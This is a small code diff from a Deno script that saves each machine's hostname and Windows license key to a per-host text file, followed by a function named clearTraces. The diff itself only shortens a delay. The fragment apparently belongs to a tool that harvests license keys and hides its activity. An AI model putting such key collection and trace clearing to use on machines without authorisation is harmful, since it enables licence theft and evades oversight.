@@ -146,7 +146,7 @@ async function copyWinKey() {
 		`WindowsKeys/${Deno.hostname()}.txt`,
 		`Machine: ${Deno.hostname()}\nWindows License Key: ${key}`,
 	);
-	await delay(3_000);
+	await delay(1_000);
 }
 
 async function clearTraces() {
